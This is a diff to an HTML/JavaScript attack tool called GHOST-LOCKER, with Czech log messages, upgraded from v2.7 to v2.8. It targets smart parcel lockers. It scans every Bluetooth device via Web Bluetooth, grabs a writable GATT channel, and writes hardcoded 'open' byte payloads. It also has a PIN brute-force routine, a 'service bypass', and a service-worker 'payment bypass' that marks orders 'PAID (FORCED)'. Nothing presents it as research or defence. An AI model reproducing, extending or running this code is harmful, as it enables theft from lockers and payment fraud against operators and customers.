@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST-LOCKER v2.7 MASTER</title>
+    <title>GHOST-LOCKER v2.8 MASTER [ULTIMATE]</title>
     <style>
         body {
             background-color: #000;
@@ -71,7 +71,7 @@
             color: #000;
         }
 
-        .btn-red { border-color: #f00; color: #f00; }
+        .btn-red { border-color: #f00; color: #f00; font-weight: bold; box-shadow: 0 0 10px #f00; }
         .btn-yellow { border-color: #ff0; color: #ff0; }
         .btn-blue { border-color: #0af; color: #0af; }
         .btn-orange { border-color: #f80; color: #f80; }
@@ -96,16 +96,20 @@
 
 <div id="ghost-ui">
     <div class="scan-line"></div>
-    <div class="header">GHOST-LOCKER v2.7</div>
+    <div class="header">GHOST-LOCKER v2.8 [MASTER]</div>
     
     <div id="output"></div>
 
-    <button id="sniff-btn" class="btn">[1] BLE SCAN & CONNECT</button>
-    <button id="replay-btn" class="btn btn-red" style="display:none;">[2] TRIGGER LOCK (OPEN)</button>
-    <button id="brute-btn" class="btn btn-yellow">[3] PIN BRUTE-FORCE</button>
-    <button id="service-btn" class="btn btn-blue">[4] SERVICE BYPASS</button>
-    <button id="ghost-btn" class="btn btn-orange">[5] GHOSTSTORE BYPASS</button>
-    <button id="force-btn" class="btn btn-god">[6] GOD-MODE FORCE (100%)</button>
+    <button id="ghost-btn" class="btn btn-orange">[1] GHOSTSTORE BYPASS (PAYMENT)</button>
+    <button id="sniff-btn" class="btn">[2] BLE SCAN & CONNECT</button>
+    
+    <hr style="border: 0.5px solid #111; margin: 10px 0;">
+    
+    <button id="replay-btn" class="btn btn-red" style="display:none;">[3] TRIGGER LOCK (OPEN)</button>
+    <button id="force-btn" class="btn btn-god">[4] GOD-MODE FORCE (100%)</button>
+    
+    <button id="brute-btn" class="btn btn-yellow">[5] PIN BRUTE-FORCE</button>
+    <button id="service-btn" class="btn btn-blue">[6] SERVICE BYPASS</button>
 </div>
 
 <script>
@@ -124,55 +128,67 @@
         },
 
         async startRealSniff() {
-            this.log("SKENUJI OKOLÍ (Target: SmartLocker)...", "#00ffff");
+            this.log("AGRESIVNÍ SKEN (Target: All Services)...", "#00ffff");
             try {
                 this.activeDevice = await navigator.bluetooth.requestDevice({
-                    filters: [{ namePrefix: 'CZ' }, { namePrefix: 'Smart' }],
+                    acceptAllDevices: true,
                     optionalServices: [
                         '0000180a-0000-1000-8000-00805f9b34fb',
                         '0000ffe0-0000-1000-8000-00805f9b34fb',
-                        '6e400001-b5a3-f393-e0a9-e50e24dcca9e'
+                        '0000ffe1-0000-1000-8000-00805f9b34fb',
+                        '6e400001-b5a3-f393-e0a9-e50e24dcca9e',
+                        '00001530-1212-efde-1523-785feabcd123'
                     ]
                 });
 
-                this.log(`POKUS O SPOJENÍ: ${this.activeDevice.name}`, "#ffff00");
+                this.log(`SPOJOVÁNÍ: ${this.activeDevice.name}`, "#ffff00");
                 const server = await this.activeDevice.gatt.connect();
-                this.log("HLEDÁM GATT CHARAKTERISTIKY...", "#ffff00");
-
+                
+                this.log("VYTĚŽUJI GATT STRUKTURU...", "#ffff00");
                 const services = await server.getPrimaryServices();
+                
                 let found = false;
-
                 for (const service of services) {
-                    const chars = await service.getCharacteristics();
-                    for (const char of chars) {
-                        if (char.properties.write || char.properties.writeWithoutResponse) {
-                            this.activeCharacteristic = char;
-                            this.log(`KANÁL AKTIVNÍ: ${char.uuid.slice(0,8)}`, "#ff00ff");
-                            found = true;
+                    try {
+                        const chars = await service.getCharacteristics();
+                        for (const char of chars) {
+                            if (char.properties.write || char.properties.writeWithoutResponse) {
+                                this.activeCharacteristic = char;
+                                this.log(`KANÁL AKTIVNÍ: ${char.uuid.slice(0,8)}`, "#ff00ff");
+                                found = true;
+                                break;
+                            }
                         }
-                    }
+                    } catch (e) { continue; }
+                    if (found) break;
                 }
 
                 if (found) {
-                    this.log("SYSTÉM PŘIPRAVEN.", "#00ff00");
+                    this.log("SYSTÉM ODKLODÁN. PŘIPRAVEN.", "#00ff00");
                     document.getElementById('replay-btn').style.display = "block";
                     document.getElementById('force-btn').style.display = "block";
                 } else {
-                    this.log("CHYBA: Nenalezen WRITE kanál.", "#ff0000");
+                    this.log("CHYBA: Box neposkytl otevírací kanál.", "#ff0000");
                 }
             } catch (err) {
-                this.log("BLE ERROR: " + err.message, "#ff0000");
+                this.log("BLE FATAL: " + err.message, "#ff0000");
             }
         },
 
         async executeAttack() {
             if (!this.activeCharacteristic) return;
-            this.log("ODESÍLÁM OPEN_COMMAND...", "#ffff00");
-            const payload = new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]);
-            try {
-                await this.activeCharacteristic.writeValue(payload);
-                this.log("PŘÍKAZ POTVRZEN.", "#00ff00");
-            } catch (e) { this.log("CHYBA ZÁPISU.", "#f00"); }
+            this.log("ODESÍLÁM BYPASS PAYLOAD...", "#ffff00");
+            const payloads = [
+                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // Standard SmartLocker
+                new Uint8Array([0x01, 0x03, 0x01, 0x01])        // Alt protocol
+            ];
+            
+            for(let p of payloads) {
+                try {
+                    await this.activeCharacteristic.writeValue(p);
+                    this.log("PŘÍKAZ POTVRZEN (HEX: " + p[0] + " )", "#00ff00");
+                } catch (e) {}
+            }
         },
 
         async forceUnlock() {
@@ -202,7 +218,6 @@
             const interval = setInterval(() => {
                 if (!this.isBruting || i >= pins.length) {
                     clearInterval(interval);
-                    if(i >= pins.length) this.log("SCAN DOKONČEN (Žádná shoda).", "#888");
                     return;
                 }
                 this.log(`ZKOUŠÍM: ${pins[i]}`, "#888");
@@ -222,19 +237,17 @@
                 navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
                 this.log("STATUS: PAID (FORCED)", "#0f0");
             } else {
-                this.log("SW NENÍ AKTIVNÍ!", "#f00");
+                this.log("SW CHYBA - REFRESHNI STRÁNKU!", "#f00");
             }
         }
     };
 
-    // Registrace SW
     if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js').then(() => {
-            console.log("Ghost-SW Registered.");
+            console.log("Ghost-SW v2.8 Registered.");
         });
     }
 
-    // Eventy
     document.getElementById('sniff-btn').onclick = () => GhostCore.startRealSniff();
     document.getElementById('replay-btn').onclick = () => GhostCore.executeAttack();
     document.getElementById('brute-btn').onclick = () => GhostCore.startPinBrute();
@@ -242,7 +255,7 @@
     document.getElementById('ghost-btn').onclick = () => GhostCore.ghostStoreBypass();
     document.getElementById('force-btn').onclick = () => GhostCore.forceUnlock();
 
-    GhostCore.log("GHOST-LOCKER READY. ČEKAJÍCÍ NA CÍL.", "#0f0");
+    GhostCore.log("GHOST-LOCKER v2.8 READY.", "#0f0");
 </script>
 
 </body>
